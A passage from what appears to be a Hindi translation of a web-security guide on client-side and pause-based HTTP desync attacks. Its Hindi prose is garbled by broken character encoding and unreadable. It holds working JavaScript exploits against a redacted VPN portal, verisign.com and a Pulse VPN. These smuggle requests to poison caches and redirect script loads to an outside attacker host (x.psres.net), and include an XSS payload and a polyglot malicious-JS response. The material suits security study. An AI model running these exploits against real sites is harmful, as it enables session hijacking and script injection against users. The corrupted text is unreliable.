* **cors mode** рд╕реЗрдЯ рдХрд░реЗрдВред рд╕рд╛рдорд╛рдиреНрдпрддрдГ рдпрд╣ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╕рд░реНрд╡рд░ рдХреА **рдкреНрд░рд╛рд░рдВрднрд┐рдХ** **POST** рдХреА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдПрдХ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рд╣реИ рдЬрд┐рд╕реЗ рдЕрдЧрд░ **рдЕрдиреБрд╕рд░рдг** рдХрд┐рдпрд╛ рдЬрд╛рдП рддреЛ **exploit рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛**ред рдЗрд╕рд▓рд┐рдП, **cors mode** рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ **рддреНрд░реБрдЯрд┐** рдХреЛ **рдЯреНрд░рд┐рдЧрд░** рдХрд░рдиреЗ рдФрд░ **`catch`** рдХреЗ рд╕рд╛рде рдкреАрдбрд╝рд┐рдд рдХреЛ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

### **Host header redirect + client-side cache poisoning**

* **JS exploit**
```javascript
fetch('https://redacted/', {
method: 'POST',
body: "GET /+webvpn+/ HTTP/1.1\r\nHost: x.psres.net\r\nX: Y",
credentials: 'include'}
).catch(() => { location='https://redacted/+CSCOE+/win.js' })
```
* `/+webvpn+/` рдкрд░ **рдЕрд▓рдЧ рдбреЛрдореЗрди рдХреЗ рд╕рд╛рде Host рд╣реЗрдбрд░** рдореЗрдВ рдПрдХ рдЕрдиреБрд░реЛрдз рдХрд╛ рдЬрд╡рд╛рдм **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХреЗ рд╕рд╛рде рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ `/+webvpn+/index.html` рдЙрд╕реА **рдбреЛрдореЗрди** рдХреЗ рд▓рд┐рдП рдЬреЛ Host рд╣реЗрдбрд░ рдореЗрдВ рд╣реИред
* **рджреВрд╕рд░реЗ** рдЕрдиреБрд░реЛрдз рдореЗрдВ рд╕реНрдерд╛рди рдХреЛ `/+CSCOE+/win.js` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЙрд╕ `.js` рдлрд╛рдЗрд▓ рдХреЗ **рдХреИрд╢** рдХреЛ **рдЬрд╣рд░реАрд▓рд╛** рдмрдирд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред
* рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХрд╛ рдЬрд╡рд╛рдм `/+webvpn+/` рдХреЗ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХреЗ рд╕рд╛рде рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдЬреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдбреЛрдореЗрди рдХреЗ рд╕рд╛рде рдкрде `/+webvpn+/index.html` рдкрд░ рд╣реЛрдЧрд╛ред
* **`win.js`** рдХрд╛ **рдХреИрд╢** рдПрдХ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХреЗ рд╕рд╛рде **рдЬрд╣рд░реАрд▓рд╛** рд╣реЛ рдЬрд╛рдПрдЧрд╛ рдЬреЛ **рд╣рдорд▓рд╛рд╡рд░** рдХреЗ рдкреЗрдЬ рдкрд░ рд╣реЛрдЧрд╛, рд▓реЗрдХрд┐рди **рдкреАрдбрд╝рд┐рдд** рднреА `location` рд╡реЗрд░рд┐рдПрдмрд▓ рдореЗрдВ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХреЗ рдЕрдиреБрд╕рд╛рд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд╛ **рдкрд╛рд▓рди** рдХрд░реЗрдЧрд╛ рдФрд░ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╡реЗрдм рдкреЗрдЬ рдкрд░ рд╕рдорд╛рдкреНрдд рд╣реЛрдЧрд╛ред
* рд╣рдорд▓рд╛рд╡рд░ рдлрд┐рд░ **рдкреАрдбрд╝рд┐рдд** рдХреЛ `https://redacted/+CSCOE+/logon.html` рдкрд░ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХрд░реЗрдЧрд╛ред рдпрд╣ рдкреЗрдЬ `/+CSCOE+/win.js` рдХреЛ рдЗрдореНрдкреЛрд░реНрдЯ рдХрд░реЗрдЧрд╛ред рдЬрд┐рд╕рдХрд╛ **рдХреИрд╢ рдПрдХ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рд╣реИ **рд╣рдорд▓рд╛рд╡рд░** рдХреЗ рд╕рд░реНрд╡рд░ рдкрд░, рдЗрд╕рд▓рд┐рдП, рд╣рдорд▓рд╛рд╡рд░ **рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг JS рдХреЗ рд╕рд╛рде рдЬрд╡рд╛рдм рджреЗ рд╕рдХрддрд╛ рд╣реИ**ред

**рдкреАрдбрд╝рд┐рдд** рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдкреЗрдЬ рдХреЛ **рджреЛ рдмрд╛рд░ рдПрдХреНрд╕реЗрд╕** рдХрд░реЗрдЧрд╛, рдкрд╣рд▓реА рдмрд╛рд░ рдпрд╣ **HTML рдХреА рдЙрдореНрдореАрдж рдХрд░рддрд╛ рд╣реИ** рдЬреЛ рдкреАрдбрд╝рд┐рдд рдХреЛ рд╡рд╛рдкрд╕ `https://redacted/+CSCOE+/logon.html` рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИ рдФрд░ рджреВрд╕рд░реА рдмрд╛рд░ рдпрд╣ **рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛрдб рдХреА рдЙрдореНрдореАрдж рдХрд░рддрд╛ рд╣реИ** (рдкреЗрд▓реЛрдб)ред рдПрдХ рдкреЙрд▓реАрдЧреНрд▓реЙрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рджреЛрдиреЛрдВ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдХреЗрд╡рд▓ рдПрдХ рдореЗрдВ рд╕реЗрд╡рд╛ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ:
```
HTTP/1.1 200 OK
Content-Type: text/html

alert('oh dear')/*<script>location = 'https://redacted/+CSCOE+/logon.html'</script>*/
```
### HEAD рдкреЗрд▓реЛрдб рдЪрдВрдХреНрдб TE рдХреЗ рд╕рд╛рде

CSD рдХреА рддрд▓рд╛рд╢ рдореЗрдВ рдЖрдк **рдЖрдВрд╢рд┐рдХ рд░реВрдк рд╕реЗ рд╡рд┐рдХреГрдд** URLs рдЬреИрд╕реЗ `/..%2f` рдпрд╛ `/%2f` рдХрд╛ рднреА **рдкрд░реАрдХреНрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

* **рд░рдВрдЧреАрди рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ**

![](<../../.gitbook/assets/image (5) (2) (1).png>)

* **JS рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ**
```javascript
fetch('https://www.verisign.com/%2f', {
method: 'POST',
body: `HEAD /assets/languagefiles/AZE.html HTTP/1.1\r\nHost: www.verisign.com\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n34d\r\nx`,
credentials: 'include',
headers: {'Content-Type': 'application/x-www-form-urlencoded'
}}).catch(() => {
let form = document.createElement('form')
form.method = 'POST'
form.action = 'https://www.verisign.com/robots.txt'
form.enctype = 'text/plain'
let input = document.createElement('input')
input.name = '0\r\n\r\nGET /<svg/onload=alert(1)> HTTP/1.1\r\nHost: www.verisign.com\r\n\r\nGET /?aaaaaaaaaaaaaaa HTTP/1.1\r\nHost: www.verisign.com\r\n\r\n'
input.value = ''
form.appendChild(input)
document.body.appendChild(form)
form.submit()
}
```
* рдкреЗрдЬ **`/%2f`** рдХреЛ **CL.0** рднреЗрджреНрдпрддрд╛ рдХрд╛ **рд╢реЛрд╖рдг** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* рдПрдХ **HEAD** рдЕрдиреБрд░реЛрдз рдХреЛ **`Transfer-Encoding: chunked` рд╣реЗрдбрд░** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЫрд┐рдкрд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* рдЗрд╕ рдкрд░рд┐рджреГрд╢реНрдп рдореЗрдВ рдпрд╣ рд╣реЗрдбрд░ рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЕрдиреНрдпрдерд╛ **рд╕рд░реНрд╡рд░ рдиреЗ рд╢рд░реАрд░ рдХреЗ рд╕рд╛рде HEAD рдЕрдиреБрд░реЛрдз рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рд╕реЗ рдЗрдирдХрд╛рд░ рдХрд░ рджрд┐рдпрд╛**ред
* рдлрд┐рд░, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ POST рднреЗрдЬрддрд╛ рд╣реИ рдЬрд┐рд╕рдХреЗ рд╢рд░реАрд░ рдореЗрдВ рдкрд┐рдЫрд▓реЗ HEAD рдЕрдиреБрд░реЛрдз рдХрд╛ **рдЕрдВрддрд┐рдо рдЯреБрдХрдбрд╝рд╛** рдФрд░ рдПрдХ **рдирдпрд╛ рдЕрдиреБрд░реЛрдз рдЬреЛ рдЫрд┐рдкрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ** рдХреЗ рд╕рд╛рде **рд╕рд╛рдордЧреНрд░реА** (JS рдкреЗрд▓реЛрдб) рд╣реЛрддреА рд╣реИ рдЬреЛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ **рдкрд░рд┐рд▓рдХреНрд╖рд┐рдд** рд╣реЛрдЧреАред
* рдЗрд╕рд▓рд┐рдП рдмреНрд░рд╛рдЙрдЬрд╝рд░ HEAD рдЕрдиреБрд░реЛрдз рдХреЗ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдХреЛ POST рдЕрдиреБрд░реЛрдз рдХреЗ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдХреЗ рд░реВрдк рдореЗрдВ рдорд╛рдиреЗрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ **рд╢рд░реАрд░** рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рднреА **рд╢рд╛рдорд┐рд▓** рд╣реЛрдЧреА рдЬреЛ рджреВрд╕рд░реЗ рдЫрд┐рдкреЗ рд╣реБрдП рдЕрдиреБрд░реЛрдз рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ **рдЗрдирдкреБрдЯ** рдХреЛ **рдкрд░рд┐рд▓рдХреНрд╖рд┐рдд** рдХрд░рддреА рд╣реИред

### рд╣реЛрд╕реНрдЯ рд╣реЗрдбрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ + RC

* **JS рд╢реЛрд╖рдг**
```html
<script>
function reset() {
fetch('https://vpn.redacted/robots.txt',
{mode: 'no-cors', credentials: 'include'}
).then(() => {
x.location = "https://vpn.redacted/dana-na/meeting/meeting_testjs.cgi?cb="+Date.now()
})
setTimeout(poison, 120) // worked on 140. went down to 110
}

function poison(){
sendPoison()
sendPoison()
sendPoison()
setTimeout(reset, 1000)
}

function sendPoison(){
fetch('https://vpn.redacted/dana-na/css/ds_1234cb049586a32ce264fd67d524d7271e4affc0e377d7aede9db4be17f57fc1.css',
{
method: 'POST',
body: "GET /xdana-na/imgs/footerbg.gif HTTP/1.1\r\nHost: x.psres.net\r\nFoo: '+'a'.repeat(9826)+'\r\nConnection: keep-alive\r\n\r\n",
mode: 'no-cors',
credentials: 'include'
}
)
}

</script>
<a onclick="x = window.open('about:blank'); reset()">Start attack</a>
```
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдлрд┐рд░ рд╕реЗ, рдПрдХ **host header** **redirect** рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **JS** рдЖрдпрд╛рдд рдХреЛ **рд╣рд╛рдЗрдЬреИрдХ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рдмрд╛рд░ **redirect cacheable рдирд╣реАрдВ рд╣реИ**, рдЗрд╕рд▓рд┐рдП рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб **cache poisoning** рдПрдХ рд╡рд┐рдХрд▓реНрдк рдирд╣реАрдВ рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣рдорд▓рд╛ **рдкреАрдбрд╝рд┐рдд рдХреЛ рдХрдордЬреЛрд░ рдкреЗрдЬ рддрдХ рдкрд╣реБрдВрдЪрд╛рдПрдЧрд╛** рдПрдХ рдЯреИрдм рдореЗрдВ рдФрд░ рдлрд┐рд░, рдмрд╕ **рдЙрд╕рд╕реЗ рдкрд╣рд▓реЗ** рдХрд┐ рдкреЗрдЬ **JS рдлрд╛рдЗрд▓ рд▓реЛрдб** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗ, **рд╕реЙрдХреЗрдЯ рдХреЛ рдкреЙрдЗрдЬрд╝рди** рдХрд░реЗрдЧрд╛ **smuggling connections** (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ 3)ред\
рдХреНрдпреЛрдВрдХрд┐ **рд╕рдордп** рдХреЛ рдмрд╣реБрдд рд╣реА **рд╕рдЯреАрдХ** рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП, рд╣рдорд▓рд╛ рд╣рд░ **рдирдП рдЯреИрдм рдкрд░ рдкреНрд░рддреНрдпреЗрдХ рдЗрдЯрд░реЗрд╢рди** рдкрд░ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрдм рддрдХ рдХрд┐ рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ред

{% hint style="warning" %}
рдзреНрдпрд╛рди рд░рдЦреЗрдВ рдХрд┐ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ `/meeting_testjs.cgi` рдкрд░ рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ **Javascript рд▓реЛрдб** рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдПрдХ **404** рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗ рд░рд╣рд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдХреИрд╢реНрдб рдирд╣реАрдВ рд╣реИред рдЕрдиреНрдп рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ рдЖрдк **рдХреИрд╢реНрдб JS рдкрд░ рд╣рдорд▓рд╛** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, рдЖрдкрдХреЛ рдЗрд╕реЗ **рдХреИрд╢ рд╕реЗ рдЧрд╛рдпрдм рд╣реЛрдиреЗ рдХрд╛ рдЗрдВрддрдЬрд╛рд░** рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдЗрд╕рд╕реЗ рдкрд╣рд▓реЗ рдХрд┐ рдЖрдк рдирдпрд╛ рд╣рдорд▓рд╛ рд╢реБрд░реВ рдХрд░реЗрдВред
{% endhint %}

рд╕рд╛рд░рд╛рдВрд╢ рдЪрд░рдг:

* рдПрдХ рдирдИ рд╡рд┐рдВрдбреЛ рдЦреЛрд▓реЗрдВред
* рдирд┐рд░рдВрддрд░ рд╕рдордп рдХреЗ рд▓рд┐рдП рдПрдХ рд╣рд╛рдирд┐рд░рд╣рд┐рдд рдЕрдиреБрд░реЛрдз рд▓рдХреНрд╖реНрдп рдХреЛ рднреЗрдЬреЗрдВ, рдПрдХ рддрд╛рдЬрд╛ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред
* рд╡рд┐рдВрдбреЛ рдХреЛ /meeting\_testjs.cgi рдкрд░ рд▓рдХреНрд╖реНрдп рдкреГрд╖реНрда рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░реЗрдВред
* 120ms рдмрд╛рдж, рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдЧреИрдЬреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рддреАрди рдкреЙрдЗрдЬрд╝рди рдХрдиреЗрдХреНрд╢рди рдмрдирд╛рдПрдВред
* 5ms рдмрд╛рдж, /meeting\_testjs.cgi рд░реЗрдВрдбрд░ рдХрд░рддреЗ рд╕рдордп рдкреАрдбрд╝рд┐рдд рдХреЛ рдЙрдореНрдореАрдж рд╣реИ рдХрд┐ /appletRedirect.js рдХреЛ рдЖрдпрд╛рдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛ рдФрд░ x.psres.net рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╣реЛ рдЬрд╛рдПрдЧрд╛, рдЬреЛ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг JS рд╕реЗрд╡рд╛ рдХрд░реЗрдЧрд╛ред
* рдЕрдЧрд░ рдирд╣реАрдВ, рддреЛ рд╣рдорд▓реЗ рдХреЛ рдлрд┐рд░ рд╕реЗ рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВред

## Pause-based desync <a href="#pause" id="pause"></a>

рдкреЙрдЬрд╝рд┐рдВрдЧ рднреА **рдЧрд▓рдд рдЕрдиреБрд░реЛрдз-рд╕рдордп рд╕реАрдорд╛ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХреЛ рдЯреНрд░рд┐рдЧрд░** рдХрд░рдХреЗ рдирдИ desync рд╕рдВрд╡реЗрджрдирд╢реАрд▓рддрд╛рдПрдВ рдкреИрджрд╛ рдХрд░ рд╕рдХрддреА рд╣реИрдВред

рдЗрд╕рд▓рд┐рдП, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдЕрдиреБрд░реЛрдз рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рд╣реЗрдбрд░реНрд╕ рдЗрдВрдЧрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдмреЙрдбреА рд╣реИ**, рдФрд░ рдлрд┐рд░ **рдлреНрд░рдВрдЯ-рдПрдВрдб рдХреЗ рдЯрд╛рдЗрдордЖрдЙрдЯ рд╣реЛрдиреЗ рдХрд╛ рдЗрдВрддрдЬрд╛рд░ рдХрд░реЗрдВ рдмреЙрдбреА рднреЗрдЬрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ**ред рдЕрдЧрд░ рдлреНрд░рдВрдЯ-рдПрдВрдб рдЯрд╛рдЗрдордЖрдЙрдЯ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди **рдХрдиреЗрдХреНрд╢рди рдЦреБрд▓рд╛ рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИ**, рддреЛ рдЙрд╕ рдЕрдиреБрд░реЛрдз рдХреА **рдмреЙрдбреА** рдХреЛ **рдирдП рдЕрдиреБрд░реЛрдз рдХреЗ рд░реВрдк рдореЗрдВ рдорд╛рдирд╛ рдЬрд╛рдПрдЧрд╛**ред

### рдЙрджрд╛рд╣рд░рдг: **Varnish**

Varnish cache рдореЗрдВ `synth()` рдирд╛рдордХ рдПрдХ рдлреАрдЪрд░ рд╣реИ, рдЬреЛ рдЖрдкрдХреЛ рдмреИрдХ-рдПрдВрдб рдХреЛ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗ рдмрд┐рдирд╛ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЬрд╛рд░реА** рдХрд░рдиреЗ рджреЗрддрд╛ рд╣реИред рдпрд╣рд╛рдБ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдирд┐рдпрдо рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдлреЛрд▓реНрдбрд░ рддрдХ рдкрд╣реБрдВрдЪ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ:
```javascript
if (req.url ~ "^/admin") {
return (synth(403, "Forbidden"));
}
```
рдЬрдм **рдЖрдВрд╢рд┐рдХ рдЕрдиреБрд░реЛрдз** рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ рдХрд┐рд╕реА рд╕рд┐рдВрде рдирд┐рдпрдо рд╕реЗ рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИ, рддреЛ Varnish **рд╕рдордп рд╕рдорд╛рдкреНрдд** рд╣реЛ рдЬрд╛рдПрдЧрд╛ рдЕрдЧрд░ рдЙрд╕реЗ **15 рд╕реЗрдХрдВрдб** рддрдХ рдХреЛрдИ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИред рдЬрдм рдРрд╕рд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдХрдиреЗрдХреНрд╢рди рдХреЛ рдкреБрди: рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдЦреБрд▓рд╛ **рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИ** рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЙрд╕рдиреЗ рд╕реЙрдХреЗрдЯ рд╕реЗ рдХреЗрд╡рд▓ рдЖрдзрд╛ рдЕрдиреБрд░реЛрдз рд╣реА рдкрдврд╝рд╛ рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЕрдЧрд░ **рдХреНрд▓рд╛рдЗрдВрдЯ рджреВрд╕рд░реЗ рд╣рд┐рд╕реНрд╕реЗ рдХреЗ рд╕рд╛рде рдЖрдЧреЗ рдмрдврд╝рддрд╛ рд╣реИ** рддреЛ рдЙрд╕реЗ рдПрдХ **рдирдП рдЕрдиреБрд░реЛрдз** рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдордЭрд╛ рдЬрд╛рдПрдЧрд╛ред

рдПрдХ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдлреНрд░рдВрдЯ-рдПрдВрдб рдкрд░ рдкреЙрдЬрд╝-рдЖрдзрд╛рд░рд┐рдд рдбрд┐рд╕рд┐рдВрдХ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЕрдкрдиреЗ рд╣реЗрдбрд░реНрд╕ рднреЗрдЬрдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ, рд╢рд░реАрд░ рдХрд╛ рд╡рд╛рджрд╛ рдХрд░реЗрдВ, рдФрд░ рдлрд┐рд░ рдмрд╕ рдкреНрд░рддреАрдХреНрд╖рд╛ рдХрд░реЗрдВред рдЕрдВрддрддрдГ рдЖрдкрдХреЛ рдПрдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧреА рдФрд░ рдЬрдм рдЖрдк рдЕрдВрдд рдореЗрдВ рдЕрдкрдиреЗ рдЕрдиреБрд░реЛрдз рд╢рд░реАрд░ рднреЗрдЬреЗрдВрдЧреЗ, рддреЛ рдЗрд╕реЗ рдПрдХ рдирдП рдЕрдиреБрд░реЛрдз рдХреЗ рд░реВрдк рдореЗрдВ рд╕рдордЭрд╛ рдЬрд╛рдПрдЧрд╛:

![](<../../.gitbook/assets/image (4) (3) (1).png>)

{% hint style="warning" %}
рдЬрд╛рд╣рд┐рд░рд╛ рддреМрд░ рдкрд░ рдпрд╣ 25 рдЬрдирд╡рд░реА рдХреЛ [CVE-2022-23959](https://varnish-cache.org/security/VSV00008.html) рдХреЗ рд░реВрдк рдореЗрдВ рдкреИрдЪ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред
{% endhint %}

### рдЙрджрд╛рд╣рд░рдг: **Apache**

Varnish рдХреА рддрд░рд╣, рдпрд╣ **рдЙрди рдПрдВрдбрдкреЙрдЗрдВрдЯреНрд╕ рдкрд░ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╣реИ рдЬрд╣рд╛рдВ рд╕рд░реНрд╡рд░ рд╕реНрд╡рдпрдВ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЙрддреНрдкрдиреНрди рдХрд░рддрд╛ рд╣реИ** рдмрдЬрд╛рдп рдЗрд╕рдХреЗ рдХрд┐ рдЕрдиреБрд░реЛрдз рдХреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рд╕рдВрднрд╛рд▓реЗред рдРрд╕рд╛ рд╣реЛрдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рд╕рд░реНрд╡рд░-рд╕реНрддрд░реАрдп рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯреНрд╕ рд╣реИ: `Redirect 301 / /en`

### рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рд╢реЛрд╖рдг <a href="#server" id="server"></a>

рдЕрдЧрд░ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рд╕рд░реНрд╡рд░ (Apache рдпрд╛ Varnish рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ) рдмреИрдХ-рдПрдВрдб рдореЗрдВ рд╣реИ, рддреЛ рдПрдХ **рдлреНрд░рдВрдЯ-рдПрдВрдб** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдЬреЛ **рдмреИрдХ-рдПрдВрдб** рд╕рд░реНрд╡рд░ рдХреЛ рдЕрдиреБрд░реЛрдз (http headers рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ) **рдмрд┐рдирд╛ рдмрдлрд░рд┐рдВрдЧ** рдХреЗ **рд╕реНрдЯреНрд░реАрдо рдХрд░рддрд╛ рд╣реИ**ред

![](<../../.gitbook/assets/image (3) (3).png>)

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рд╕рдордп рд╕рдорд╛рдкреНрддрд┐ рддрдм рддрдХ рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛрдЧреА рдЬрдм рддрдХ рд╡рд╣ рд╢рд░реАрд░ рдирд╣реАрдВ рднреЗрдЬ рджреЗрддрд╛**ред рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдЙрд╕реЗ рд╕рдордп рд╕рдорд╛рдкреНрддрд┐ рдХрд╛ рдкрддрд╛ рд╣реИ рддреЛ рдпрд╣ рд╕рдорд╕реНрдпрд╛ рдирд╣реАрдВ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред

Amazon рдХрд╛ Application Load Balancer (ALB) **рдЬрд░реВрд░рдд рдХреЗ рдЕрдиреБрд╕рд╛рд░ рдХрдиреЗрдХреНрд╢рди рдХрд╛ рдбреЗрдЯрд╛ рд╕реНрдЯреНрд░реАрдо рдХрд░реЗрдЧрд╛**, рд▓реЗрдХрд┐рди рдЕрдЧрд░ рд╡рд╣ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ рдЖрдзреЗ рдЕрдиреБрд░реЛрдз (рд╕рдордп рд╕рдорд╛рдкреНрддрд┐) рдХреЗ **рдкрд╣рд▓реЗ** рд╢рд░реАрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рд╕реЗ **рдкрд╣рд▓реЗ**, рддреЛ рд╡рд╣ **рд╢рд░реАрд░ рдирд╣реАрдВ рднреЗрдЬреЗрдЧрд╛**, рдЗрд╕рд▓рд┐рдП рдпрд╣рд╛рдВ рдПрдХ **Race Condition** рдХрд╛ рд╢реЛрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП:

